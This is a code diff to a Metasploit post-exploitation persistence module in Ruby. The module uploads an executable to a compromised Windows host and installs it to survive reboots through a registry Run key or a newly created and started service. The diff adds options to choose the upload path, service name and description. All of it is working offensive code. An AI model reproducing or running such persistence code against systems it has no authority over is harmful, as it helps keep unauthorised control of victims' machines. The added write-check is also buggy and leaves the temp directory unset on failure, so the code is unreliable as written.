@@ -34,10 +34,18 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM', 'SERVICE']]),
-        OptPath.new('REXEPATH', [true, 'The remote executable to use.']),
+        OptPath.new('REXEPATH', [true, 'The remote executable to upload and execute.']),
         OptString.new('REXENAME', [true, 'The name to call exe on remote system', 'default.exe'])
       ], self.class
     )
+
+    register_advanced_options(
+      [
+        OptString.new('LEXEPATH', [false, 'The local exe path to run. Use temp directory as default. ']),
+        OptString.new('STARTUP_NAME',   [false, 'The name of service or registry. Random string as default.' ]),
+        OptString.new('SERVICE_DESC',   [false, 'The description of service. Random string as default.' ])
+      ])
+
   end
 
   # Run Method for when run command is issued
@@ -123,7 +131,7 @@ class MetasploitModule < Msf::Post
   # Function to install payload in to the registry HKLM or HKCU
   #-------------------------------------------------------------------------------
   def write_to_reg(key, script_on_target)
-    nam = Rex::Text.rand_text_alpha(rand(8) + 8)
+    nam = datastore['STARTUP_NAME'] || Rex::Text.rand_text_alpha(rand(8) + 8)
     print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
     if key
       registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", nam, script_on_target, "REG_SZ")
@@ -138,9 +146,21 @@ class MetasploitModule < Msf::Post
   def install_as_service(script_on_target)
     if  is_system? || is_admin?
       print_status("Installing as service..")
-      nam = Rex::Text.rand_text_alpha(rand(8) + 8)
+      nam = datastore['STARTUP_NAME'] || Rex::Text.rand_text_alpha(rand(8) + 8)
+      description = datastore['SERVICE_DESC'] || Rex::Text.rand_text_alpha(8)
       print_status("Creating service #{nam}")
-      service_create(nam, :path=>"cmd /c \"#{script_on_target}\"")
+
+      key = service_create(nam, :path=>"cmd /c \"#{script_on_target}\"",:display=>description)
+
+      # check if service had been created
+      if key != 0
+        print_error("Service #{nam} creating failed.")
+        return
+      end
+
+      # if service is stopped, then start it.
+      service_start(nam) if service_status(nam)[:state] == 1 
+
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
       print_error("Insufficient privileges to create service")
@@ -150,8 +170,26 @@ class MetasploitModule < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(rexe, rexename)
-    tempdir = session.fs.file.expand_path("%TEMP%")
+    if not datastore['LEXEPATH'].nil? 
+    # check we have write permissions 
+    # I made it by myself because the function filestat.writable? was not implemented yet.
+      testfile = datastore['LEXEPATH'] + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
+      fd = session.fs.file.new(testfile,"w")
+      if fd 
+        fd.close
+        session.fs.file.rm(testfile)
+        tempdir = datastore['LEXEPATH'] 
+      else
+        print_warning("Insufficient privileges to write in  #{datastore['LEXEPATH']}")
+      end
+
+    # Write to %temp% directory if not writable or not set LEXEPATH
+    else 
+      tempdir = session.fs.file.expand_path("%TEMP%")
+    end
+
     temprexe = tempdir + "\\" + rexename
+
     fd = session.fs.file.new(temprexe, "wb")
     fd.write(rexe)
     fd.close
